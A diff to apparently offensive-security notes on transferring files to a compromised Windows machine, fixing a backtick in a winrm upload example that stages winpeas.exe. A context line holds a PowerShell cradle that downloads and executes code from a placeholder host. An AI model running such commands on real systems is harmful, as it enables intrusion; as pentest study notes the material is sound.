@@ -5,4 +5,4 @@ Transferring files to the compromised windows machine:
 - `iex(new-object net.webclient).downloadstring('http://<IP>/<filename>')`
 
 Using winrm
-`upload <full path to local file> <full path to destination`> for example `upload /home/kali/tools/winpeas.exe C:\\users\\tadi\\winpeas.exe`
+`upload <full path to local file> <full path to destination>` for example `upload /home/kali/tools/winpeas.exe C:\\users\\tadi\\winpeas.exe`
